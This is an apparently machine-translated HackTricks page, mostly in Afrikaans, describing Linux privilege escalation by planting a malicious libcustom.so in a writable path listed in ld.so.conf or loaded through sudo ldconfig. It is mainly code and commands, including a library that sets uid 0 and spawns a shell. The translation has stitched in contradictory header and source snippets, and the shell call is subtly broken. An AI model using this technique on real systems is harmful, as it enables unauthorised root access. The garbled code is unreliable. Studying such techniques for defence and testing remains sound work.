# ld.so privesc uitbuiting voorbeeld

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere manieren om HackTricks te ondersteunen:

* Als je je **bedrijf wilt adverteren in HackTricks** of **HackTricks in PDF wilt downloaden**, bekijk dan de [**ABONNEMENTSPAKKETTEN**](https://github.com/sponsors/carlospolop)!
* Koop de [**officiële PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), onze collectie exclusieve [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit je aan bij de** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of de [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel je hacktrucs door PR's in te dienen bij de** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Bereid de omgeving voor

In de volgende sectie vind je de code van de bestanden die we gaan gebruiken om de omgeving voor te bereiden

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% tab title="libcustom.h" %}

Hierdie lêer definieer die funksies en strukture vir die `libcustom` biblioteek.

```c
#ifndef LIBCUSTOM_H
#define LIBCUSTOM_H

#include <stdio.h>

// Funksie om 'n boodskap na die skerm te druk
void print_message(const char* message);

// Funksie om twee getalle op te tel
int add_numbers(int a, int b);

#endif /* LIBCUSTOM_H */
```

{% endtab %}
```c
#include <stdio.h>

void vuln_func();
```
{% tab title="libcustom.c" %}

Hier is 'n voorbeeld van 'n eenvoudige C-program wat 'n aangepaste biblioteek, libcustom.so, gebruik:

```c
#include <stdio.h>

void custom_function() {
    printf("Hierdie is 'n aangepaste funksie in die libcustom.so biblioteek.\n");
}
```

Hierdie program bevat 'n enkele funksie, `custom_function()`, wat 'n eenvoudige boodskap na die uitvoer skryf. Hierdie funksie sal gebruik word in die volgende voorbeeld om die priviligie-escalasie te demonstreer.

{% endtab %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% tabs %}
{% tab title="Afrikaans" %}
1. **Skep** daardie lêers op jou rekenaar in dieselfde vouer
2. **Kompileer** die **biblioteek**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopieer** `libcustom.so` na `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privs)
4. **Kompileer** die **uitvoerbare lêer**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Kontroleer die omgewing

Kontroleer dat _libcustom.so_ vanaf _/usr/lib_ **gelaai** word en dat jy die binêre lêer kan **uitvoer**.
{% endtab %}
{% endtabs %}
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Uitbuiting

In hierdie scenario gaan ons aanneem dat **iemand 'n kwesbare inskrywing geskep het** binne 'n lêer in _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Die kwesbare gids is _/home/ubuntu/lib_ (waar ons skryftoegang het).\
**Laai die volgende kode af en stel dit saam** binne daardie pad:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Nou dat ons die kwaadwillige libcustom-biblioteek binne die verkeerd gekonfigureerde pad geskep het, moet ons wag vir 'n herlaai of vir die root-gebruiker om `ldconfig` uit te voer (as jy hierdie binêre lêer as `sudo` kan uitvoer of as dit die `suid-bit` het, sal jy dit self kan uitvoer).

Sodra dit gebeur het, **herkontroleer** waar die `sharevuln` uitvoerbare lêer die `libcustom.so`-biblioteek laai vanaf:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Soos u kan sien, laai dit dit vanaf `/home/ubuntu/lib` en as enige gebruiker dit uitvoer, sal 'n skulp uitgevoer word:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Let wel dat ons in hierdie voorbeeld nie voorregte verhoog het nie, maar deur die opdragte wat uitgevoer word te wysig en **te wag vir die root- of ander bevoorregte gebruiker om die kwesbare binêre lêer uit te voer**, sal ons in staat wees om voorregte te verhoog.
{% endhint %}

### Ander verkeerde konfigurasies - Dieselfde kwesbaarheid

In die vorige voorbeeld het ons 'n verkeerde konfigurasie vervals waar 'n administrateur **'n nie-bevoorregte vouer binne 'n konfigurasie-lêer binne `/etc/ld.so.conf.d/`** ingestel het.\
Maar daar is ander verkeerde konfigurasies wat dieselfde kwesbaarheid kan veroorsaak, as jy **skryfregte** het in 'n **konfigurasie-lêer** binne `/etc/ld.so.conf.d`, in die vouer `/etc/ld.so.conf.d` of in die lêer `/etc/ld.so.conf`, kan jy dieselfde kwesbaarheid konfigureer en uitbuit.

## Uitbuiting 2

**Stel dat jy sudo-voorregte het oor `ldconfig`**.\
Jy kan `ldconfig` aandui **waar om die konf-lêers vanaf te laai**, sodat ons dit kan benut om `ldconfig` willekeurige vouers te laat laai.\
So, laat ons die lêers en vouers skep wat nodig is om "/tmp" te laai:
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Nou, soos aangedui in die **vorige uitbuit**, **skep die skadelike biblioteek binne `/tmp`**.\
En uiteindelik, laai die pad en kyk waar die binêre lading die biblioteek vandaan:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Soos u kan sien, kan u dieselfde kwesbaarheid uitbuit deur sudo-voorregte oor `ldconfig` te hê.**

{% hint style="info" %}
Ek **het nie** 'n betroubare manier gevind om hierdie kwesbaarheid uit te buit as `ldconfig` gekonfigureer is met die **suid-bit**. Die volgende fout verskyn: `/sbin/ldconfig.real: Kan nie tydelike kaslêer /etc/ld.so.cache~ skep nie: Toestemming geweier`
{% endhint %}

## Verwysings

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* Dab-masjien in HTB

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As u u **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel u haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
